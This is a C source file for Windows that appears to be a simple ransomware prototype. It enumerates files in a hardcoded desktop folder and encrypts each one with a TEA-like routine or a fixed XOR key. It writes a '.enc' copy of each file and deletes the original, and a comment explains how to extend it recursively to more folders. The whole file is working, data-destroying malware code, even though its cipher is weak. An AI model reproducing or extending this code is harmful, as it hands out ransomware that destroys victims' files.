#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <time.h>

#define MIN(a, b) ((a) < (b) ? (a) : (b))
#define err(fmt, ...) fprintf(stderr, fmt, __VA_ARGS__)

#define FREAD_BLOCK_SIZE  (2048)
#define FWRITE_BLOCK_SIZE (2048)
#define ENC_BLOCK_SIZE (2)
#define ENC_NUM_ROUND (64)
#define KEY_SIZE (4)

const char* getExtension(const char* szPath);
void enumFilesAndFolders(const char* szPath, void(*encryptFunc)(const char*, unsigned int));
void encrypt1(unsigned int nRound, unsigned char v[ENC_BLOCK_SIZE], unsigned char key[KEY_SIZE]);
void encrypt2(unsigned char* data, unsigned int dataLength, unsigned char* key, unsigned int keyLength);
void encrypt(const char* szPath, unsigned int fileSize);
void initKey();

static unsigned char g_key1[KEY_SIZE];
static unsigned int g_key2;

int main(int argc, char* argv[])
{
	initKey();
	enumFilesAndFolders("C:\\Users\\xikhud\\Desktop\\EncFolder", encrypt);
	return 0;
}

const char* getExtension(const char* szPath)
{
	int i = strlen(szPath) - 1;
	while (i >= 0 && szPath[i] != '.')
		--i;
	if (i < 0)
		return NULL;
	return (szPath + i + 1);
}

void enumFilesAndFolders(const char* szPath, void(*encryptFunc)(const char*, unsigned int))
{
	if (strlen(szPath) > 250)
		return;
	char szTmpPath[260];
	strcpy(szTmpPath, szPath);
	strcat(szTmpPath, "\\*"); // strlen(szPath) + strlen("\\*") must < MAX_PATH (which is 260)

	WIN32_FIND_DATA file;
	HANDLE hFind = FindFirstFileA(szTmpPath, &file);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		err("[+] Invalid handle\n");
		return;
	}
	do
	{
		const char* szFileName = file.cFileName;
		if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // if this is folder, then we continue. We only encrypt files, not folders
			continue;										  // but we can actually recursive call this function with this folder's name as the first param, to encrypt all data in it, too
		strcpy(szTmpPath, szPath);
		strcat(szTmpPath, "\\");
		strcat(szTmpPath, szFileName);
		unsigned int fileSize = (unsigned int)file.nFileSizeLow;
		encryptFunc(szTmpPath, fileSize);
	} while (FindNextFileA(hFind, &file));
	FindClose(hFind);
}

void encrypt1(unsigned int nRound, unsigned char v[ENC_BLOCK_SIZE], unsigned char key[KEY_SIZE])
{
	unsigned char v0 = v[0], v1 = v[1];
	unsigned int sum = 0, delta = 0x9E3779B9;
	for (unsigned int i = 0; i < nRound; ++i)
	{
		v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum % KEY_SIZE]);
		sum += delta;
		v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) % KEY_SIZE]);
	}
	v[0] = v0; v[1] = v1;
}

void encrypt2(unsigned char * data, unsigned int dataLength, unsigned char * key, unsigned int keyLength)
{
	for (unsigned int i = 0; i < dataLength; ++i)
	{
		data[i] = data[i] ^ key[i % keyLength];
	}
}

void encrypt(const char* szPath, unsigned int fileSize)
{
	const char* szSpecialTypes[3] = { "exe", "png", "pdf" };
	const char* szExt = getExtension(szPath);
	if (strcmp(szExt, "enc") == 0) // if this file is already encrypted, return
		return;
	bool bIsSpecial = false;
	for (int i = 0; i < sizeof(szSpecialTypes) / sizeof(szSpecialTypes[0]); ++i)
		if (strcmp(szExt, szSpecialTypes[i]) == 0)
			bIsSpecial = true;
	FILE* f = fopen(szPath, "rb");
	if (f == NULL)
	{
		err("[+] Cannot open file %s\n", szPath);
		return;
	}
	unsigned char* lpBuffer = (unsigned char*)malloc(fileSize);
	if (lpBuffer == NULL)
	{
		err("[+] Not enough memory\n");
		fclose(f);
		return;
	}
	unsigned int nRead = 0;
	while (nRead < fileSize)
	{
		int n = fread((void*)(lpBuffer + nRead), sizeof(unsigned char), MIN(FREAD_BLOCK_SIZE, fileSize - nRead), f);
		nRead += n;
	}
	fclose(f);
	if (bIsSpecial)
	{
		unsigned int nBlock = fileSize / ENC_BLOCK_SIZE;
		for (unsigned int i = 0; i < nBlock; ++i)
		{
			encrypt1(ENC_NUM_ROUND, &lpBuffer[2 * i], g_key1);
		}
	}
	else
	{
		encrypt2(lpBuffer, fileSize, (unsigned char*)&g_key2, KEY_SIZE);
	}

	char szNewPath[260];
	strcpy(szNewPath, szPath);
	strcat(szNewPath, ".enc");
	FILE* newFile = fopen(szNewPath, "wb");
	unsigned int nWrite = 0;
	if (newFile == NULL)
	{
		free(lpBuffer);
		return;
	}
	while (nWrite < fileSize)
	{
		int n = fwrite((const void*)(lpBuffer + nWrite), sizeof(unsigned char), MIN(FWRITE_BLOCK_SIZE, fileSize - nWrite), newFile);
		nWrite += n;
	}
	fclose(newFile);
	DeleteFileA(szPath);
	free(lpBuffer);
}

void initKey()
{
	srand(time(0));
	for (int i = 0; i < KEY_SIZE; ++i)
		g_key1[i] = (unsigned int)rand() % 256;
	g_key2 = (0xDE << 24) | (0xAD << 16) | (0xC0 << 8) | (0xDE);
}